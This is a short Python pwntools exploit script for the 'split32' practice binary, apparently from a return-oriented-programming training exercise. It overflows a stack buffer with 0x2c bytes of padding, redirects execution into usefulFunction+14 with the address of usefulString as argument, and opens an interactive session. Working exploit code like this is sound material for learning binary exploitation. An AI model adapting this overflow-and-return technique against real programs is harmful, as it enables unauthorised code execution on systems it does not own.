#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

gs='''
b *pwnme
b *pwnme+89
c
'''

#context(terminal=['tmux', 'split-window', '-h'])
# Set up pwntools for the correct architecture
elf =  ELF('split32')
context.binary=elf
# context(terminal=['tmux'])

useful_str=elf.symbols["usefulString"]
useful_fun=elf.symbols["usefulFunction"]

offset=0x2c

io = process([elf.path])
#io = gdb.debug([elf.path],gdbscript=gs)
# gdb.attach(io,gs)
time.sleep(.5)

print(f"{useful_str=:x}")
print(f"{useful_fun=:x}")

io.recvuntil(b"> ")

# On retourn en useful_fun pour sauter l'affectation de edi dans la fonction
PL=offset*b"A"+p32(useful_fun+14)+p32(useful_str)
print(PL.hex())
io.sendline(PL)
io.interactive()

